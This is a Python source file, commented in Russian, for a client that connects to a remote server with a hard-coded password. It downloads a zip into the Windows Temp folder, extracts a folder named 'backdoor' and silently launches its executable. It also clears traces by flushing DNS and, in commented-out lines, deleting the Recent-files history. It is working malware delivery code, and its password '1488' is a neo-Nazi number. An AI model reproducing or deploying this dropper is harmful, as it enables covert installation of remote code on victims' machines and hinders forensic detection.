import socket
import os
import zipfile
import subprocess
from subprocess import Popen
import shutil


class Client:
    """Самописный клиент для доставки файлов с удалённого сервера"""
    def __init__(self, host: str = "0.0.0.0", port: int = 12345):   # Указать ip и port
        self.host = host
        self.port = port
        self.password = b"1488" # Пароль, который должен совпадать с сервером
        self.path = fr'C:\Users\{os.environ.get("USERNAME")}\AppData\Local\Temp'    # Место получения файла
        self.folder_in_zip = "backdoor"     # Названия папки внутри архива
        self.file_name = "received.zip"     # Как будет называться архив
        self.startfile = "client.exe"   # Названия файла для запуска доставленной программы
        self.socket = socket.socket()

    def is_connected(self):
        try:
            self.socket.send(b"PING")
            return True
        except Exception:
            return False

    def connect(self):
        try:
            print(f"Try to connect {self.host}:{self.port}..")
            self.socket.connect((self.host, self.port))
            self.socket.send(self.password)
            print("Connected")

            return
        except (ConnectionRefusedError, TimeoutError):
            print("Connection error.")
            return

    def disconnect(self):
        self.socket.close()
        print(f"Disconnected from {self.host}:{self.port}")
        return

    def receive_file(self):
        print("Trying to receive file..")
        try:
            part_file = self.socket.recv(1024)
        except Exception:
            print("Error receive file, Connected?")
            if self.is_connected():
                self.receive_file()
            else:
                print("Abort receive file.")
                return
        f = open(fr'{self.path}\{self.file_name}', 'wb')
        while part_file:
            f.write(part_file)
            part_file = self.socket.recv(1024)
        self.socket.shutdown(socket.SHUT_WR)
        f.close()
        print("Done. File was received.")
        return

    def unpack_zip(self):
        try:
            with zipfile.ZipFile(fr'{self.path}\{self.file_name}', 'r') as zip_ref:
                zip_ref.extractall(self.path)
            print(f"{self.file_name} was unziped")
            os.remove(fr'{self.path}\{self.file_name}')
            print(f"{self.file_name} was removed")
            return
        except Exception:
            print("Cant unpack zip file")
            return

    def del_file(self):
        try:
            shutil.rmtree(fr"{self.path}\{self.folder_in_zip}")
            print(fr"Removed {self.folder_in_zip}")
            return
        except Exception:
            print("Error removing. File doesn't exist.")
            return

    def status(self, printresult = True):
        isdir = os.path.isdir(fr'{self.path}\{self.folder_in_zip}')
        if isdir:
            if printresult:
                print(f"{self.folder_in_zip} installed.")
            return True
        else:
            if printresult:
                print(f"{self.folder_in_zip} not installed.")
            return False

    def inv_start(self):
        try:
            Popen(fr'start {self.path}\{self.folder_in_zip}\{self.startfile}', shell=True)
            print(f"{self.startfile} was launched")
            return
        except Exception:
            print(f"Error invisible start {self.startfile}. File exist?")
            return

    @staticmethod
    def clear_logs():
        with open(os.devnull, 'wb') as devnull:
            subprocess.check_call(['ipconfig', '/flushdns'], stdout=devnull, stderr=subprocess.STDOUT)
        # Доп очистка логов:
        # os.system('cd %appdata%\Microsoft\Windows\Recent')
        # os.system('echo y | del *.*')
        # os.system(r'cd %appdata%\microsoft\windows\recent\automaticdestinations')
        # os.system('echo y | del *.*')
        print("Logs were cleared")


    @staticmethod
    def ded_inside():
        x = 1000
        while x >= 0:
            y = x - 7
            print(x, "- 7 =", y)
            x = y
